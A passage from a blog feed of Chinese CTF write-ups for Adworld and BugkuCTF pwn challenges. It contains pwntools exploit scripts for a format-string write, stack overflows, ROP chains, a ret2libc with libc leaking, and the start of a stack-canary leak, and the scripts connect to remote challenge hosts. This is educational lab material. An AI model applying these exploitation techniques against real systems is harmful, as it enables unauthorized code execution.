class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;CGfsb&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name:&quot;</span>, <span class="string">&quot;sncker&quot;</span>)</span><br><span class="line">payload = p32(pwnme) + <span class="string">&quot;%4c%10$n&quot;</span>  <span class="comment">#pwnme地址4字节再用%4c补齐8个字符</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;please:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;level2&quot;&gt;&lt;a href=&quot;#level2&quot; class=&quot;headerlink&quot; title=&quot;level2&quot;&gt;&lt;/a&gt;level2&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/sncker/resource/raw/master/image/20200425185019.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="攻防世界" scheme="https://sncker.github.io/blog/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="Adworld" scheme="https://sncker.github.io/blog/tags/Adworld/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF-WriteUp</title>
    <link href="https://sncker.github.io/blog/2020/03/05/BugkuCTF-WriteUp/"/>
    <id>https://sncker.github.io/blog/2020/03/05/BugkuCTF-WriteUp/</id>
    <published>2020-03-05T05:35:00.000Z</published>
    <updated>2020-04-26T01:21:28.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>题目：nc 114.116.54.89 10001  </p><p>nc上去直接给shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc 114.116.54.89 10001</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">helloworld</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;6979d853add353c9&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200305143135.png" alt=""><br>什么都没开,丢ida分析。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200305143746.png" alt=""><br>很明显的栈溢出，还有一个get_shell_()函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200305144007.png" alt=""><br>地址是0x400751,直接overflow覆盖掉main的返回地址。<br>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;pwn2&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;ing?&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(<span class="number">0x400751</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200305144555.png" alt=""><br>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n0w_y0u_kn0w_the_Stack0verfl0w&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>checksec同样没开什么保护。<br>丢ida分析main函数，只看到溢出，没有其它明显的利用。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on,try to pwn me&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So~sad,you are fail&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时找找其它的函数，发现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400751</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;ok~you find me,but you can&#x27;t get my shell&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接return了system调用，但是参数不能开shell。<br>不过我们有了system函数的地址0x400570<br>按照思路应该找出”/bin/sh”这样的参数传给system，但是在数据段中并没有找到这样的字符串。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200305180310.png" alt=""><br>刚入门哦，这题不尝龟了奥！不真实了<br>回到正题，先看linux下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200305184505.png" alt=""><br>也就是说$0=shell文件名<br>再回头看数据段中，可以看到有一个”$0”结尾的字符串，容易算出“$0”的地址是0x60111f<br>然后就是传参，X64中的Calling Convention不是在栈中，而是依次使用寄存器rdi,rsi,rdx,rcx,r8,r9，当参数超过6个时才会push stack。<br>所以需要找出pop rdi;ret;的汇编片段，借助ROPgadget工具。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200305185733.png" alt=""></p><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;pwn4&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span> ,<span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;pwn me\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x400570</span></span><br><span class="line">sh = <span class="number">0x60111f</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007d3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200305191537.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;264bc50112318cd6e1a67b0724d6d3af&#125;</span><br></pre></td></tr></table></figure><p>这一题在本机测试时crash了，我本机环境是ubuntu18的，原因是18下调用system涉及到栈对齐的知识。这个问题以后再开坑细写。主要是远端环境没影响，而且只读0x30也刚刚好。   </p><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>checksec一下<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200323210909.png" alt=""><br>开了NX保护，先丢IDA分析一下。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;人类的本质是什么?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;一位群友打烂了复读机!&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n人类还有什么本质?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(&amp;s, <span class="string">&quot;鸽子&quot;</span>) || !<span class="built_in">strstr</span>(&amp;s, <span class="string">&quot;真香&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;你并没有理解人类的本质,再见!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;人类的三大本质:复读机,真香,鸽子&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的两处漏洞<br>第一处fmt漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">printf</span>(&amp;s, &amp;s);</span><br></pre></td></tr></table></figure><p>第二处overflower  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">0x40</span>uLL);</span><br></pre></td></tr></table></figure><p>看了一下没有可利用的funtion，只能ret2libc.<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200323213447.png" alt=""><br>先在printf处下断调试。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200323213158.png" alt=""><br>看到了__libc_start_main+231的返回地址，算一下可以从第11（算上6个寄存器）个参数可以leak出这个地址，再减去231的偏移拿到__libc_start_main的地址。<br>然后我们需要拿到libc的base,再找到对应的偏移拿到system和/bin/sh的地址。<br>但是题目没用给出libc文件不知道版本，那么就可以使用LibcSearcher这个工具。  </p><p>然后就是栈溢出漏洞，为了不被exit掉输入中需要有“真香鸽子”才能跳过if。填充就用ljust来，因为涉及到了中文字符，utf8编码可伸缩，字节数不固定。<br>因为是64位所以老规矩需要找pop rdi;ret的片段。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200324122655.png" alt=""><br>然后构造Rop链。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./human&quot;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;人类的本质是什么?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;%11$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print r.recvuntil(&quot;%11$p&quot;)</span></span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;%11$p&quot;</span>)[<span class="number">2</span>:-<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print leak_addr</span></span><br><span class="line"></span><br><span class="line">libc_start_main = leak_addr - <span class="number">231</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libc_base = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400933</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;真香鸽子&quot;</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bin_sh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">r.recvuntil(<span class="string">&quot;人类还有什么本质?&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>因为我本地是ubuntu18，调用system要多插个ret对齐128位，这题又刚好只read0x40所以直接打了远端。<br>但是打远端的时候识别不出libc版本。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200324132348.png" alt=""><br>然后看了一下别人的writeup发现远端坏境的leak地址是__libc_start_main+240。<br>所以我的ubuntu18的本地库的版本和远端不一样，偏移也不一样。<br>所以最终libc_start_main应该是-240的。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>, <span class="number">10005</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./human&quot;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;人类的本质是什么?&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;%11$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print r.recvuntil(&quot;%11$p&quot;)</span></span><br><span class="line">leak_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;%11$p&quot;</span>)[<span class="number">2</span>:-<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print leak_addr</span></span><br><span class="line"></span><br><span class="line">libc_start_main = leak_addr - <span class="number">240</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>, libc_start_main)</span><br><span class="line">libc_base = libc_start_main - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400933</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;真香鸽子&quot;</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bin_sh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">r.recvuntil(<span class="string">&quot;人类还有什么本质?&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200324133326.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;as67sdf834ht98e7sdyf9348yf0y&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>checksec除了relro全开<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200402121600.png" alt=""></p><p>丢ida分析<br>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vul()函数  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> note_len; <span class="comment">// [rsp+4h] [rbp-4ECh]</span></span><br><span class="line">  FILE *fp; <span class="comment">// [rsp+8h] [rbp-4E8h]</span></span><br><span class="line">  <span class="keyword">char</span> fpath[<span class="number">20</span>]; <span class="comment">// [rsp+10h] [rbp-4E0h]</span></span><br><span class="line">  <span class="keyword">char</span> memory[<span class="number">600</span>]; <span class="comment">// [rsp+30h] [rbp-4C0h]</span></span><br><span class="line">  <span class="keyword">char</span> thinking_note[<span class="number">600</span>]; <span class="comment">// [rsp+290h] [rbp-260h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+4E8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(memory, <span class="number">0</span>, <span class="number">0x258</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(fpath, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(thinking_note, <span class="number">0</span>, <span class="number">0x258</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to noteRead system&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;there is there notebook: flag, flag1, flag2&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  Please input the note path:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, fpath, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( fpath[<span class="built_in">strlen</span>(fpath) - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    fpath[<span class="built_in">strlen</span>(fpath) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(fpath) &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;note path false!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fp = fopen(fpath, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    noteRead(fp, memory, <span class="number">0x244</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(memory);</span><br><span class="line">    fclose(fp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write some note:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  please input the note len:&quot;</span>);</span><br><span class="line">  note_len = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;note_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input the note:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, thinking_note, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)note_len);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;the note is: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(thinking_note);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(thinking_note) != <span class="number">624</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error: the note len must be  624&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;  so please input note(len is 624)&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, thinking_note, <span class="number">0x270</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>边看代码边跑一边程序<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200403183414.png" alt=""></p><p>第一个read读路径，并输出文件内容，读取长度设得刚好，利用不了。后面thinking_note的read里，note_len由输入决定，导致溢出。但因为开了canary保护，就需要把canary的值leak出来。再看后面第二个read读624的长度溢出24个字节，刚好可以将leak的canary写回并覆盖retaddr。<br>先着手解决canary保护的绕过,canary的最低位都是0x00用来截断，需要覆盖掉才能recv后面的数据。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#r = process(&quot;./read_note&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;114.116.54.89&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please input the note:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">600</span> + <span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span 